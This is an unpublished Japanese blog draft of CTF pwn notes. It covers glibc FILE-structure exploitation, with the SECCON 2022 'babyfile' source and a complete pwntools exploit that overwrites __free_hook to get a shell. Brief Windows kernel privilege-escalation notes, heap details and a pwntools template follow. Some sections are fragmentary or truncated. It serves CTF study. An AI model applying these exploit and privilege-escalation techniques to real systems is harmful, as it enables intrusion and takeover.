---
title: "【CTF 探訪記】File Structure Oriented Programming"
emoji: "📘"
type: "tech" # tech: 技術記事 / idea: アイデア
topics: ["CTF", "pwn"]
published: false
---

pwn というのはメモリの書き換えや読み取りなどの低レイヤーの脆弱性を用いて意図しない動作を引き起こさせる競技で最もハッキングっぽい分野です。

- [Stack Exploits](https://zenn.dev/anko/articles/ctf-stack-exploits)
- [Heap Exploits](https://zenn.dev/anko/articles/ctf-heap-exploits)

今回は

### _IO_FILE 構造体の書き換え

```c
struct _IO_FILE
{
  int _flags;                /* High-order word is _IO_MAGIC; rest is flags. */
  /* The following pointers correspond to the C++ streambuf protocol. */
  char *_IO_read_ptr;        /* Current read pointer */
  char *_IO_read_end;        /* End of get area. */
  char *_IO_read_base;        /* Start of putback+get area. */
  char *_IO_write_base;        /* Start of put area. */
  char *_IO_write_ptr;        /* Current put pointer. */
  char *_IO_write_end;        /* End of put area. */
  char *_IO_buf_base;        /* Start of reserve area. */
  char *_IO_buf_end;        /* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */
  struct _IO_marker *_markers;
  struct _IO_FILE *_chain;
  int _fileno;
  int _flags2;
  __off_t _old_offset; /* This used to be _offset but it's too small.  */
  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];
  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};

```

```c
struct _IO_FILE_plus
{
  _IO_FILE file;
  const struct _IO_jump_t *vtable;
};

```

```c
struct _IO_jump_t
{
    JUMP_FIELD(size_t, __dummy);
    JUMP_FIELD(size_t, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow);
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    /* showmany */
    JUMP_FIELD(_IO_xsputn_t, __xsputn);
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    JUMP_FIELD(_IO_seekoff_t, __seekoff);
    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    JUMP_FIELD(_IO_sync_t, __sync);
    JUMP_FIELD(_IO_doallocate_t, __doallocate);
    JUMP_FIELD(_IO_read_t, __read);
    JUMP_FIELD(_IO_write_t, __write);
    JUMP_FIELD(_IO_seek_t, __seek);
    JUMP_FIELD(_IO_close_t, __close);
    JUMP_FIELD(_IO_stat_t, __stat);
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    JUMP_FIELD(_IO_imbue_t, __imbue);
#if 0
    get_column;
    set_column;
#endif
};
```

- [ヒープ系問題におけるstdout / stderrを利用したメモリリーク - CTFするぞ](https://ptr-yudai.hatenablog.com/entry/2019/05/31/235444)
# babyfile upsolve

https://github.com/SECCON/SECCON2022_online_CTF

source code
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

static int menu(void);
static int getnline(char *buf, int size);
static int getint(void);

#define write_str(s) write(STDOUT_FILENO, s, sizeof(s)-1)

int main(void){
        FILE *fp;

        alarm(60);

        write_str("Play with FILE structure\n");

        if(!(fp = fopen("/dev/null", "r"))){
                write_str("Open error");
                return -1;
        }
        fp->_wide_data = NULL;

        for(;;){
                switch(menu()){
                        case 0:
                                goto END;
                        case 1:
                                fflush(fp);
                                break;
                        case 2:
                                {
                                        unsigned char ofs;
                                        write_str("offset: ");
                                        if((ofs = getint()) & 0x80)
                                                ofs |= 0x40;
                                        write_str("value: ");
                                        ((char*)fp)[ofs] = getint();
                                }
                                break;
                }
                write_str("Done.\n");
        }

END:
        write_str("Bye!");
        _exit(0);
}

static int menu(void){
        write_str("\nMENU\n"
                        "1. Flush\n"
                        "2. Trick\n"
                        "0. Exit\n"
                        "> ");

        return getint();
}

static int getnline(char *buf, int size){
        int len;

        if(size <= 0 || (len = read(STDIN_FILENO, buf, size-1)) <= 0)
                return -1;

        if(buf[len-1]=='\n')
                len--;
        buf[len] = '\0';

        return len;
}

static int getint(void){
        char buf[0x10] = {};

        getnline(buf, sizeof(buf));
        return atoi(buf);
}
```

/dev/null を開いたFILE構造体に好き放題書き込める
fflushできるときどうやってshellにつなげるか

### leak

vtableを直接改ざんするのは無理(アドレスが特定セクションの範囲内にあるかチェックするので)
vtableをずらすことはできる

とりあえずheap領域のbufferを `_IO_write_*`に設定できた

glibc-2.31のコードを読むと
 `_IO_new_file_sync -> _IO_do_flush -> _IO_do_write -> ... -> new_do_write`
 みたいな流れがある `_IO_do_flush`ではwrite_baseからwrite_ptrの位置まで出力を吐き出す
 そのためfilenoをSTDOUT_fileno(=1)に設定してwrite_baseを適当に巻き戻すと出力される。
 (このときnew_do_writeの分岐のためにread_endもwrite_baseと同じ値にしておく必要がある)
 1/16なので若干だるい

 leak完了

### control PC

IO_new_file_flushでvtableの_IO_new_file_syncを呼び出すと
引数は`(FILE *,int?,heap addr)`になる vtable関数の中からこの引数でAAW or get PCできるものを探すしかない

引数的にありえそうな候補
- `_IO_finish_t(FILE *,int)`
- `_IO_overflow_t(FILE *,int)`
- `_IO_overflow_t(FILE *,int)`
- `_IO_pbackfail_t(FILE *)`
- `_IO_seekoff_t(FILE *,off64_t,int)`
- `_IO_seekpos_t(FILE *,off64_t,int)`

### toketa
```python
from pwn import *

#context.terminal = ['tmux','splitw','-h']
context.terminal = ['open_tab.sh']

read_ptr = 0x8
read_end = 0x10
read_base = 0x18
write_base = 0x20
write_ptr = 0x28
write_end = 0x30

while True:
    io = process('./chall')

    def fflush():
        io.sendlineafter(b'> ',b'1')

    def overwrite(off,val):
        io.sendlineafter(b'> ',b'2')
        io.sendlineafter(b'offset: ',str(off).encode())
        io.sendlineafter(b'value: ',str(val).encode())

    def overwrite_word(off,val):
        for i in range(8):
            overwrite(off+i,val & 0xff)
            val >>= 8

    fflush()
    fflush()

    overwrite(0xd8,0xa8)
    fflush()

    log.info("called _IO_file_doallocate")

    overwrite(0xd8,0x60)
    fflush()

    log.info("called _IO_file_underflow")

    overwrite(0xd8,0xa0)
    overwrite(0x70,0x1)
    overwrite(0x20,0x90)
    overwrite(0x21,0x12)
    overwrite(0x10,0x90)
    overwrite(0x11,0x12)

    log.info("overwrite read_end,write_base")

    fflush()

    log.info("leak by _IO_new_file_sync")

    buf = io.recv(0x80)
    if len(buf) != 0x80:
        io.close()
        continue

    libc_base = u64(buf[0x78:0x80]) + 0x7f13af008000 - 0x7f13af1f55c0
    heap_base = u64(buf[0x18:0x20]) + 0x564653a51000 - 0x564653a5350f
    log.info(f'libc_base = {hex(libc_base)}')
    log.info(f'heap_base = {hex(heap_base)}')

    gdb.attach(io,'''
            b *main+121
            c
            set $foo = *((long *)$rsp + 1)
    ''')

    input()

    def AAW(addr,val):
        overwrite_word(0xd8,libc_base + 0x7f30d22140e0 - 0x7f30d202b000)
        overwrite_word(0xf0,addr)
        overwrite_word(0xf8,addr)
        overwrite_word(write_base,0)
        overwrite_word(write_ptr,val)
        fflush()

    free_hook = libc_base + 0x7f6822dbde48 - 0x7f6822bcf000
    one_gadget = libc_base + 0xe3b01

    AAW(free_hook,one_gadget)

    log.info('overwrite free_hook')

    IO_file_jumps = libc_base + 0x7fba711e64a0 - 0x7fba70ffd000

    overwrite_word(0xd8,IO_file_jumps - 0x50)
    overwrite_word(0x70,0xffffffffffffffff)

    log.info('prepared finish->free')

    fflush()

    io.interactive()

    break
```

https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique

Windows OS の歴史



Service Pack
後で Kernel Driver の脆弱性を突いて kASLR, NX, SMEP, SMAP, kCFG, HVCI などのカーネルモードの緩和策をバイパスし、権限昇格することを目指します。
## Kernel Exploit
権限昇格 (Priviladge Escalation) とはその名の通り低い権限から高い権限へ昇格して、より幅広いことが実行できるようになります。権限昇格の方法には 2 つあります。

- カーネルモード中に任意コード実行する
- アクセストークンを盗む

昔は [NtQuerySystemInformation 関数](https://learn.microsoft.com/ja-jp/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation) を用いて ntoskrnl.exe にある HalDispatchTable のアドレスを取得、書き換えて NtQueryIntervalProfile 関数を呼ぶことでカーネルモードで HalDispatchTable を呼び出し、権限昇格していたのですが低い integrity のユーザーに対しては禁止されたので今は厳しいです。

https://inaz2.hatenablog.com/entry/2015/09/15/121926

NonPagedPool を実行可能で Kenrel mode から実行する
Windows Kernel Driver の脆弱性
- tagWND
- GdiSharedHandleTable -> kernel address 消す,
- Page Table Entry overwrite

### Token Stealing

### tagWND
- Window Function running in kernel mode

tagWND の後の Window Extra Data の長さ cbwndExtra を大きくすることで AAR, AAW を可能にする脆弱性です。
gSharedInfo
aheList
tagMenu, tagWND

## ヒープ領域

ヒープからのメモリ割り当て (HeapCreate, HeapAlloc, HeapFree)
仮想メモリの直接の割り当て (VirtualAlloc, VirtualAllocEx)

| Allocation Size | Granularity | Bucket |
| --- | --- | --- |
| 1 ~ 1,024 bytes (0x1 ~ 0x400) | 16 bytes | 1 ~ 64 |
| 1,025 ~ 2,048 bytes (0x401 ~ 0x800) | 64 bytes | 65 ~ 80 |
| 2,049 ~ 4,096 bytes (0x801 ~ 0x1000) | 128 bytes | 81 ~ 96 |
| 4,097 ~ 8,192 bytes (0x1001 ~ 0x2000) | 256 bytes | 97 ~ 112 |
| 8,193 ~ 16,368 bytes (0x2001 ~ 0x3FF0) | 512 bytes | 113 ~ 128 |

メモリ割り当ての API
CoTaskMemAlloc
GlobalAlloc
HeapAlloc
LocalAlloc
malloc
new
VirtualAlloc

Heap Terminate On Corruption
ヒープが破損した場合にプロセスを強制終了することによって、ヒープ破損の例外ハンドラを悪用する攻撃や時々ヒープの破損を起こす程度の Exploit を防御するという、ヒープの整合性を検証する機能*3。HeapSetInformation 関数




## ツール
ローカルで実行バイナリを動かして解析したいときデバッガーが重宝します。ELF のデファクトスタンダードなデバッガーは gdb で、使い方は他の記事を参考にしてください。

また、gdb に拡張的な機能を与えるプラグインも開発されていて、現在、主要なプラグインは次のようなものです。全部セットで入れられるインストーラーもあります。

- gdb-peda
- pwndbg (コマンドが豊富でおすすめ)
- gef

https://github.com/apogiatzis/gdb-peda-pwndbg-gef

大抵の問題は `nc` コマンドでサーバーに接続してバイナリが実行されるような形式で主題され、実行バイナリやソースコードも配られることもあります。この通信を簡単に取り扱いたい、またバイナリを解析したいというモチベーションで作られた pwntools、そしてそれを改良した ptrlib という Python のパッケージがあります。このような便利なパッケージが多く、言語は Python が選ばれやすいです。

https://github.com/Gallopsled/pwntools
https://github.com/ptr-yudai/ptrlib

pwn で私がいつも使っている Python のテンプレートです。

```python
from pwn import *
import sys

binary_path = './chall'

if len(sys.argv) == 3:
    io = remote(sys.argv[1], int(sys.argv[2]))
else:
    io = process(binary_path)
elf = ELF(binary_path)
# libc = ELF("./libc.so.6")
# system_offset = libc.symbols['system']
# binsh_offset = next(libc.search('/bin/sh\x00'))

def wait_for_attach():
    print('attach?')
    raw_input()

payload = b''
io.sendlineafter(b'> ', payload)
io.recvline()
io.interactive()
```
